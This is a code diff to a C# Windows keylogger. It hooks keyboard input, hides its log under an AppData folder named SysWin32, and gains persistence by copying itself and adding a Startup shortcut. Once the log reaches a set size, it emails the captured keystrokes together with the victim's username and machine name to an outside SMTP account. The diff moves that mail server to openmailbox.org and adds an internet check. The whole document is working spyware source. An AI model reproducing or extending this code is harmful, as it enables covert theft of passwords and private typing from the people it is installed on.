@@ -11,6 +11,8 @@ using System.Net;
 using System.Net.Mail;
 using IWshRuntimeLibrary;
 using System.Collections.Generic;
+using System.Security;
+using System.Security.Cryptography;
 
 class InterceptKeys
 {
@@ -20,9 +22,9 @@ class InterceptKeys
     private static IntPtr _hookID = IntPtr.Zero;
 
     // You have to modify these to actual addresses and password
-    private const string senderEmail = "fakemail@gmail.com";
-    private const string receiverEmail = "realmail@yourdomain.com";
-    private const string senderPassword = "P4s5w0rd";
+    private const string senderEmail = "fakemail@openmailbox.org";
+    private const string receiverEmail = "receiver@openmailbox.org";
+    private const string senderPassword = "p4ssw0rd";
 
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr SetWindowsHookEx(int idHook,
@@ -92,11 +94,11 @@ class InterceptKeys
 
             //Send log via email when it reaches a certain weight.
             FileInfo logFile = new FileInfo(appData + @"\SysWin32\log.txt");
-            if (logFile.Exists && logFile.Length > 1000)
+            if (logFile.Exists && logFile.Length > 1000 && checkInternet())
             {
-                sendmail(System.IO.File.ReadAllText(logFile.ToString()), senderEmail, receiverEmail, senderPassword);
-                string filename = "log_" + Environment.UserName + "@" + Environment.MachineName + "_" + DateTime.Now.ToString(@"MM_dd_yyyy_hh\hmm\mss") + ".txt";
-                logFile.MoveTo(appData + @"\SysWin32\logs\" + filename);
+               string filename = "log_" + Environment.UserName + "@" + Environment.MachineName + "_" + DateTime.Now.ToString(@"MM_dd_yyyy_hh\hmm\mss") + ".txt";
+               sendMail(System.IO.File.ReadAllText(logFile.ToString()), senderEmail, receiverEmail, senderPassword, filename);
+               logFile.MoveTo(appData + @"\SysWin32\logs\" + filename);
             }
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -118,7 +120,7 @@ class InterceptKeys
         if (!System.IO.File.Exists(copyPath))
         {
             System.IO.File.Copy(myPath, copyPath);
-            CreateShortcut("SysWin32", startupPath, copyPath);
+            createShortcut("SysWin32", startupPath, copyPath);
         }
     }
 
@@ -129,19 +131,20 @@ class InterceptKeys
     /// <param name="sender">Sender's email address</param>
     /// <param name="receiver">Receiver's email address</param>
     /// <param name="password">Password of the sender's email account</param>
-    private static void sendmail(string logs, string sender, string receiver, string password)
+    /// <param name="filename">Name of the log file</param>
+    private static void sendMail(string logs, string sender, string receiver, string password, string filename)
     {
         // Assign variables
         var fromAddress = new MailAddress(sender, "From Sender");
         var toAddress = new MailAddress(receiver, "To Receiver");
         string fromPassword = password;
-        string subject = "Subject";
+        string subject = filename;
         string body = logs;
 
         // Create an SMTP Client object and instantiate its properties 
         var smtp = new SmtpClient
         {
-            Host = "smtp.gmail.com",
+            Host = "smtp.openmailbox.org",
             Port = 587,
             EnableSsl = true,
             DeliveryMethod = SmtpDeliveryMethod.Network,
@@ -174,6 +177,7 @@ class InterceptKeys
         var specialKeys = new Dictionary<string, string>()
         {
             {"Back", " *back* "},
+            {"Delete", " *delete* "},
             {"Return", "\n"},
             {"Space", " "},
             {"Add", "+"},
@@ -221,7 +225,7 @@ class InterceptKeys
     /// <param name="shortcutPath">The location of the shortcut</param>
     /// <param name="targetFileLocation">What should be linked</param>
     /// Require "using IWshRuntimeLibrary;", and a reference to Windows Script Host Model
-    public static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
+    public static void createShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
     {
         string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
         WshShell shell = new WshShell();
@@ -230,5 +234,23 @@ class InterceptKeys
         shortcut.Description = "Keys";
         shortcut.TargetPath = targetFileLocation;
         shortcut.Save();
+    }
+
+    public static bool checkInternet()
+    {
+       try
+       {
+          using (var client = new WebClient())
+          {
+             using (var stream = client.OpenRead("http://www.google.com"))
+             {
+                return true;
+             }
+          }
+       }
+       catch
+       {
+          return false;
+       }
     }
 }
